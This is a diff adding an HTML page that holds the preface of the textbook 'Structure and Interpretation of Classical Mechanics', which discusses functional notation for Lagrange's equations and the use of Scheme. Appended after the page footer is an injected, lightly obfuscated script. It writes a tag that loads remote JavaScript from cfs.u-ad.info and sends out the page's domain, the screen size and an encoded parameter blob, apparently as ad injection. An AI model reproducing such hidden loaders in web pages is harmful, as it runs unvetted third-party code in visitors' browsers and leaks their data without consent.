@@ -1,0 +1,266 @@
+<!doctype html public "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html>
+<!-- Generated from TeX source by tex2page, v 4p3, 
+     (c) Dorai Sitaram, http://www.cs.rice.edu/~dorai/tex2page -->
+<head>
+<title>
+
+Structure and Interpretation 
+of Classical Mechanics
+
+</title>
+<link rel="stylesheet" type="text/css" href="book-Z-C.css" title=default>
+<meta name=robots content="noindex,follow">
+</head>
+<body>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-4.html">previous</a></span><span>, <a href="book-Z-H-6.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<a name="%_chap_Temp_2"></a>
+<h1 class=chapter>
+<div class=chapterheading>&nbsp;</div><br>
+<a href="book-Z-H-4.html#%_toc_%_chap_Temp_2">Preface</a></h1>
+<p></p>
+<p>
+
+</p>
+
+<div align=right> 
+<table width=60%><tr><td>
+<span class=epigraph>
+
+<p>
+``In almost all textbooks, even the best, this principle is presented
+so that it is impossible to understand.'' (K. Jacobi, <em>Lectures on
+Dynamics</em>, 1842-1843).  I have not chosen to break with tradition.</p>
+<p>
+<a name="%_idx_2"></a>V.&nbsp;I.&nbsp;Arnold, <i>Mathematical Methods of Classical Mechanics</i> 
+[<a href="book-Z-H-80.html#cite{Arnold80}">5</a>],
+footnote, p.&nbsp;246</p>
+<p>
+</p>
+
+</span>
+</td></tr></table>
+</div>
+
+<p></p>
+<p>
+There has been a remarkable revival of interest in classical mechanics
+in recent years.  We now know that there is much more to classical
+mechanics than previously suspected.  The behavior of classical
+systems is surprisingly rich; derivation of the equations of motion,
+the focus of traditional presentations of mechanics, is just the
+beginning.  Classical systems display a complicated array of phenomena
+such as nonlinear resonances, chaotic behavior, and transitions to
+chaos.</p>
+<p>
+Traditional treatments of mechanics concentrate most of their effort
+on the extremely small class of symbolically tractable dynamical
+systems.  We concentrate on developing general methods for studying
+the behavior of systems, whether or not they have a symbolic solution.
+Typical systems exhibit behavior that is qualitatively different from
+the solvable systems and surprisingly complicated.  We focus on the
+phenomena of motion, and we make extensive use of computer simulation
+to explore this motion.</p>
+<p>
+Even when a system is not symbolically tractable, the tools of
+modern dynamics allow one to extract a qualitative understanding.
+Rather than concentrating on symbolic descriptions, we concentrate on
+geometric features of the set of possible trajectories.  Such tools
+provide a basis for the systematic analysis of numerical or
+experimental data.</p>
+<p>
+Classical mechanics is deceptively simple.  It is surprisingly easy to
+get the right answer with fallacious reasoning or without real
+understanding.  <a name="%_idx_4"></a><a name="%_idx_6"></a>Traditional mathematical notation contributes to this
+problem.  Symbols have ambiguous meanings that depend on context,
+and often even change within a given context.<a name="call_footnote_Temp_3" href="#footnote_Temp_3"><sup><small>1</small></sup></a>
+<a name="%_idx_10"></a>For example, a fundamental
+result of mechanics is the Lagrange equations.  In traditional
+notation the Lagrange equations are written</p>
+<p>
+</p>
+<div align=left><img src="front-Z-G-1.gif" border="0"></div>
+<p> </p>
+<p>
+The Lagrangian <em>L</em> must be interpreted as a function of the position
+and velocity components <em>q</em><sup><em>i</em></sup> and <img src="front-Z-G-D-1.gif" border="0"><sup><em>i</em></sup>, so that the partial
+derivatives make sense, but then in order for the time derivative
+<em>d</em>/<em>d</em><em>t</em> to make sense solution paths must have been inserted into the
+partial derivatives of the Lagrangian to make functions of time.  The
+traditional use of ambiguous notation is convenient in simple
+situations, but in more complicated situations it can be a serious
+handicap to clear reasoning.  In order that the reasoning be clear and
+unambiguous, we have adopted a more precise mathematical notation.
+Our notation is <a name="%_idx_12"></a><a name="%_idx_14"></a>functional and follows that of modern mathematical
+presentations.<a name="call_footnote_Temp_4" href="#footnote_Temp_4"><sup><small>2</small></sup></a>
+An introduction to our functional notation is in an appendix.
+<p>
+Computation also enters into the presentation of the mathematical
+ideas underlying mechanics.  We require that our mathematical
+notations be explicit and precise enough that they can be
+interpreted automatically, as by a computer.  As a consequence of this
+requirement the formulas and equations that appear in the text stand
+on their own.  They have clear meaning, independent of the informal
+context.  For example, we write Lagrange's equations in functional
+notation as follows:<a name="call_footnote_Temp_5" href="#footnote_Temp_5"><sup><small>3</small></sup></a></p>
+<p>
+</p>
+<div align=left><img src="front-Z-G-4.gif" border="0"></div>
+<p></p>
+<p>
+The Lagrangian <em>L</em> is a real-valued function of time <em>t</em>, 
+coordinates&nbsp;<em>x</em>, and velocities <em>v</em>; the value is <em>L</em>(<em>t</em>, <em>x</em>, <em>v</em>).  <a name="%_idx_20"></a><a name="%_idx_22"></a>Partial
+derivatives are indicated as derivatives of functions with respect to
+particular argument positions; <img src="front-Z-G-D-2.gif" border="0"><sub>2</sub> <em>L</em> indicates the function
+obtained by taking the partial derivative of the Lagrangian function
+<em>L</em> with respect to the velocity argument position.  The traditional
+partial derivative notation, which employs a derivative with respect
+to a ``variable,'' depends on context and can lead to ambiguity.<a name="call_footnote_Temp_6" href="#footnote_Temp_6"><sup><small>4</small></sup></a>
+The partial derivatives of the Lagrangian are then explicitly evaluated
+along a path function <em>q</em>.  The time derivative is taken and the
+Lagrange equations formed.  Each step is explicit; there are no
+implicit substitutions.</p>
+<p>
+Computational algorithms are used to communicate precisely some of the
+methods used in the analysis of dynamical phenomena.  Expressing the
+methods of variational mechanics in a computer language forces them to
+be unambiguous and computationally effective.  Computation requires us
+to be precise about the representation of mechanical and geometric
+notions as computational objects and permits us to represent
+explicitly the algorithms for manipulating these objects.  Also, once
+formalized as a procedure, a mathematical idea becomes a tool that can
+be used directly to compute results.</p>
+<p>
+Active exploration on the part of the student is an essential part of
+the learning experience.  Our focus is on understanding the motion of
+systems; to learn about motion the student must actively explore the
+motion of systems through simulation and experiment.  The exercises
+and projects are an integral part of the presentation.</p>
+<p>
+That the mathematics is precise enough to be interpreted automatically
+allows active exploration to be extended to it.  The
+requirement that the computer be able to interpret any expression
+provides strict and immediate feedback as to whether the expression is
+correctly formulated.  Experience demonstrates that interaction with
+the computer in this way uncovers and corrects many deficiencies in
+understanding.</p>
+<p>
+<a name="%_idx_26"></a>In this book we express computational methods in Scheme, a dialect of
+the Lisp family of programming languages that we also use in our
+introductory computer science subject at MIT.  There are many good
+expositions of Scheme.  We provide a short introduction to Scheme in
+an appendix.</p>
+<p>
+Even in the introductory computer science class we never formally
+teach the language, because we do not have to.  We just use it, and
+students pick it up in a few days.  This is one great advantage of
+Lisp-like languages: They have very few ways of forming compound
+expressions, and almost no syntactic structure.  All of the formal
+properties can be covered in an hour, like the rules of chess.  After
+a short time we forget about the syntactic details of the language
+(because there are none) and get on with the real issues -- figuring
+out what we want to compute.</p>
+<p>
+The advantage of Scheme over other languages for the exposition of
+classical mechanics is that the manipulation of procedures that
+implement mathematical functions is easier and more natural in Scheme
+than in other computer languages.  Indeed, many theorems of mechanics
+are directly representable as Scheme programs.   </p>
+<p>
+The version of Scheme that we use in this book is MIT Scheme,
+augmented with a large library of software called <a name="%_idx_28"></a>Scmutils that
+extends the Scheme operators to be generic over a variety of
+mathematical objects, including symbolic expressions.  The Scmutils
+library also provides support for the numerical methods we use in this
+book, such as quadrature, integration of systems of differential
+equations, and multivariate minimization.</p>
+<p>
+<a name="%_idx_30"></a><a name="%_idx_32"></a>The Scheme system, augmented with the Scmutils library, is free
+software.  We provide this system, complete with documentation and
+source code, in a form that can be used with the GNU/Linux operating
+system, on the Internet at <br>
+<a name="%_idx_34"></a><tt>http://www-mitpress.mit.edu/sicm</tt>.</p>
+<p>
+This book presents classical mechanics from an unusual perspective.
+It focuses on understanding motion rather than deriving equations of
+motion.  It weaves recent discoveries in nonlinear dynamics throughout
+the presentation, rather than presenting them as an afterthought.  It
+uses functional mathematical notation that allows precise
+understanding of fundamental properties of classical mechanics.  It
+uses computation to constrain notation, to capture and formalize
+methods, for simulation, and for symbolic analysis.</p>
+<p>
+This book is the result of teaching classical mechanics at MIT for the
+past six years.  The contents of our class began with ideas from a
+class on nonlinear dynamics and solar system dynamics by Wisdom and
+ideas about how computation can be used to formulate methodology
+developed in an introductory computer science class by Abelson and
+Sussman.  When we started we expected that using this approach to
+formulate mechanics would be easy.  We quickly learned that
+many things we thought we understood we did not in
+fact understand.  Our requirement that our mathematical notations be
+explicit and precise enough that they can be interpreted
+automatically, as by a computer, is very effective in uncovering puns
+and flaws in reasoning.  The resulting struggle to make the
+mathematics precise, yet clear and computationally effective, lasted
+far longer than we anticipated.  We learned a great deal about both
+mechanics and computation by this process.  We hope others, especially
+our competitors, will adopt these methods, which enhance understanding
+while slowing research.</p>
+<p>
+</p>
+<p>
+</p>
+<p>
+
+
+</p>
+<div class=smallprint><hr></div>
+<p></p>
+<div class=footnote>
+<p><a name="footnote_Temp_3" href="#call_footnote_Temp_3"><sup><small>1</small></sup></a> In his book on mathematical pedagogy&nbsp;[<a href="book-Z-H-80.html#cite{Freudenthal}">17</a>],
+<a name="%_idx_8"></a>  Hans Freudenthal argues 
+that the reliance on
+ambiguous, unstated notational conventions in such expressions as
+<em>f</em>(<em>x</em>) and <em>d</em><em>f</em>(<em>x</em>)/<em>d</em><em>x</em> makes mathematics, and especially introductory
+calculus, extremely confusing for beginning students; and he enjoins
+mathematics educators to use more formal modern notation.</p>
+
+<p><a name="footnote_Temp_4" href="#call_footnote_Temp_4"><sup><small>2</small></sup></a> In his beautiful book <em>Calculus on Manifolds</em> [<a href="book-Z-H-80.html#cite{Spivak}">40</a>],
+<a name="%_idx_16"></a><a name="%_idx_18"></a>  Michael Spivak uses functional notation.  On p.&nbsp;44 he 
+discusses some of the problems with classical notation.  We excerpt a
+particularly juicy passage:
+</p>
+<blockquote>
+The mere statement of [the chain rule] in classical
+notation requires the introduction of irrelevant letters.  The usual
+evaluation for <em>D</em><sub>1</sub>(<em>f</em><small>o</small>(<em>g</em>,<em>h</em>)) runs as follows:
+<p>
+If <em>f</em>(<em>u</em>,<em>v</em>) is a function and <em>u</em> = <em>g</em>(<em>x</em>,<em>y</em>) and <em>v</em> = <em>h</em>(<em>x</em>,<em>y</em>)
+then 
+</p>
+<div align=left><img src="front-Z-G-2.gif" border="0"></div>
+<p> [The symbol
+<img src="front-Z-G-D-2.gif" border="0"> <em>u</em>/<img src="front-Z-G-D-2.gif" border="0"> <em>x</em> means <img src="front-Z-G-D-2.gif" border="0">/<img src="front-Z-G-D-2.gif" border="0"> <em>x</em>&nbsp;<em>g</em>(<em>x</em>,<em>y</em>), and
+<img src="front-Z-G-D-2.gif" border="0">/<img src="front-Z-G-D-2.gif" border="0"> <em>u</em>&nbsp;<em>f</em>(<em>u</em>,<em>v</em>) means <em>D</em><sub>1</sub> <em>f</em>(<em>u</em>,<em>v</em>)  =  <em>D</em><sub>1</sub>
+<em>f</em>(<em>g</em>(<em>x</em>,<em>y</em>),<em>h</em>(<em>x</em>,<em>y</em>)).]  This equation is often written simply
+</p>
+<div align=left><img src="front-Z-G-3.gif" border="0"></div>
+<p> 
+Note that <em>f</em> means something different on the two sides of the
+equation!
+</p>
+</blockquote></p>
+
+<p><a name="footnote_Temp_5" href="#call_footnote_Temp_5"><sup><small>3</small></sup></a> This is presented here without explanation, to give the
+flavor of the notation.  The text gives a full explanation.</p>
+
+<p><a name="footnote_Temp_6" href="#call_footnote_Temp_6"><sup><small>4</small></sup></a> ``It is necessary to use the apparatus of partial derivatives, in
+which even the notation is ambiguous.'' V.I. Arnold, <em>Mathematical Methods of Classical Mechanics</em> [<a href="book-Z-H-80.html#cite{Arnold80}">5</a>], Section 47, p.&nbsp;258.
+<a name="%_idx_24"></a>  See also the footnote on that page.</p>
+</div>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-4.html">previous</a></span><span>, <a href="book-Z-H-6.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582NgXaqsgjSGNhMkGfMSQiD2f2Kz9LzT7tCSwJsfSbSsQUbuP5og2R7DbuIM5QvchHMTO4PuKoWr0xF4TGfgr58389DVnkKUTUf4ZXQzX05vEckc8DdWnINhacUL4x4OutSN5nPHsJBznFfxyPfM6Das36wgc6Ce3OYkMGja7K1AtNJfB1RTnd3iVTARmK3HdlFG2%2bXAQd6NXp5HnkXbmGdoRMES8aKylti9RDkYZdFroWchr495ijK3hPhfo9qWlYbZ7yY8NBOL9uSr2zgthYKID8hKZv6ivC4F9XHDWP53y8KbW2EsoGe3Quk%2fEojeuP9gobaQ0YTlPyKDA769pKNNGzod9PTEuCuxLOWf4IPz8cjjiQ9TnfDBFHqXzOKIcgsb5O8ndjhc5mgNrOn0cq7nYpgfGoGQ%2fMFcX6OrKZR99i7yXizD%2bQS0Qp%2bLjwZVH7SquI%2bOBByeR%2bdZ%2bzxD9xIje1%2ftEFp3L4GUQjh3%2bqW4L");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body></body>
+</html>
